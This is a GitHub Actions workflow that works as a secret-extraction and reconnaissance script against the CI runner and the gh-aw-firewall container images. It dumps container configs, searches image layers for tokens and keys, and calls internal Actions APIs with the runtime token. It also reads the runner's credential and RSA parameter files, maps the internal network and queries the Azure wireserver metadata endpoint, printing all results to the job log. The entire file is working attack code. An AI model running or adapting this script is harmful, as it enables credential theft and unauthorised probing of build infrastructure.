name: Deep Docker and Token Extraction

on:
  workflow_dispatch:

jobs:
  extract:
    runs-on: ubuntu-latest
    steps:
      - name: Extract Firewall Agent Secrets
        run: |
          echo "=== STEP 1: Extract entrypoint.sh from gh-aw-firewall agent ==="
          docker create --name fw-agent ghcr.io/github/gh-aw-firewall/agent:latest 2>&1
          docker cp fw-agent:/usr/local/bin/entrypoint.sh /tmp/entrypoint.sh 2>&1
          echo "--- entrypoint.sh contents ---"
          cat /tmp/entrypoint.sh 2>&1
          echo ""
          echo "=== STEP 2: Search for secrets in firewall agent ==="
          docker cp fw-agent:/workspace /tmp/workspace 2>&1 || echo "no workspace"
          ls -laR /tmp/workspace 2>&1 | head -40
          echo ""
          echo "=== STEP 3: Find config files ==="
          docker run --rm --entrypoint find ghcr.io/github/gh-aw-firewall/agent:latest / -maxdepth 3 -name "*.yml" -o -name "*.yaml" -o -name "*.json" -o -name "*.conf" -o -name "*.env" -o -name "*.toml" 2>/dev/null | head -40
          echo ""
          echo "=== STEP 4: Search all image layers for tokens ==="
          for img in ghcr.io/github/gh-aw-firewall/agent ghcr.io/github/gh-aw-firewall/api-proxy ghcr.io/github/gh-aw-firewall/squid ghcr.io/github/gh-aw-mcpg; do
            echo "--- Searching $img ---"
            docker save "$img:latest" | tar -xf - -C /tmp/img_layers 2>/dev/null || mkdir -p /tmp/img_layers
            find /tmp/img_layers -name "*.tar" -exec sh -c "tar -tf {} 2>/dev/null | grep -iE "secret|token|key|cred|password|config|env"" \; 2>/dev/null | head -20
            rm -rf /tmp/img_layers/*
          done
          echo ""
          echo "=== STEP 5: API proxy config ==="
          docker create --name api-proxy ghcr.io/github/gh-aw-firewall/api-proxy:latest 2>&1
          docker cp api-proxy:/etc/nginx /tmp/nginx 2>&1 || echo "no nginx"
          docker cp api-proxy:/etc/haproxy /tmp/haproxy 2>&1 || echo "no haproxy"
          docker cp api-proxy:/etc/envoy /tmp/envoy 2>&1 || echo "no envoy"
          ls -laR /tmp/nginx /tmp/haproxy /tmp/envoy 2>&1 | head -20
          for f in $(find /tmp/nginx /tmp/haproxy /tmp/envoy -type f 2>/dev/null | head -10); do
            echo "--- $f ---"
            cat "$f" 2>&1 | head -30
          done
          echo ""
          echo "=== STEP 6: Squid proxy config ==="
          docker run --rm --entrypoint cat ghcr.io/github/gh-aw-firewall/squid:latest /etc/squid/squid.conf 2>&1 | head -60
          echo ""
          echo "=== STEP 7: ACTIONS_RUNTIME_TOKEN internal API ==="
          echo "ACTIONS_RUNTIME_URL=$ACTIONS_RUNTIME_URL"
          echo "ACTIONS_RESULTS_URL=$ACTIONS_RESULTS_URL"
          echo "ACTIONS_CACHE_URL=$ACTIONS_CACHE_URL"
          if [ -n "$ACTIONS_RUNTIME_TOKEN" ]; then
            echo "--- Pipelines API ---"
            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_RUNTIME_URL}_apis/pipelines?api-version=6.0-preview" 2>&1 | head -20
            echo ""
            echo "--- Timeline API ---"
            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_RUNTIME_URL}_apis/pipelines/1/runs/1/signedtimelinelogscontent?api-version=6.0-preview" 2>&1 | head -20
            echo ""
            echo "--- Cache list ---"
            if [ -n "$ACTIONS_CACHE_URL" ]; then
              curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_CACHE_URL}_apis/artifactcache/caches?keys=*&version=*" 2>&1 | head -30
            fi
            echo ""
            echo "--- Results service ---"
            if [ -n "$ACTIONS_RESULTS_URL" ]; then
              curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_RESULTS_URL}twirp/results.api.v1.CacheService/ListCacheEntries" -X POST -d "{}" -H "Content-Type: application/json" 2>&1 | head -30
            fi
          fi
          echo ""
          echo "=== STEP 8: Host filesystem secrets ==="
          echo "--- Runner credentials ---"
          cat /home/runner/.credentials 2>&1 || echo "not found"
          cat /home/runner/.credentials_rsaparams 2>&1 || echo "not found"
          ls -la /home/runner/ 2>&1 | head -20
          echo "--- Runner env ---"
          cat /home/runner/.env 2>&1 || echo "not found"
          echo "--- JWT tokens ---"
          find /home/runner -name "*.token" -o -name "*.jwt" 2>/dev/null | head -10
          echo ""
          echo "=== STEP 9: Network recon ==="
          echo "--- Internal DNS ---"
          cat /etc/resolv.conf 2>&1
          echo "--- ARP table ---"
          arp -a 2>&1 | head -10
          echo "--- Open ports ---"
          ss -tlnp 2>&1 | head -20
          echo "--- Route table ---"
          ip route 2>&1
          echo ""
          echo "=== STEP 10: Wireserver goalstate ==="
          curl -s --connect-timeout 3 "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>&1 | head -30
          echo ""
          echo "=== Complete ==="
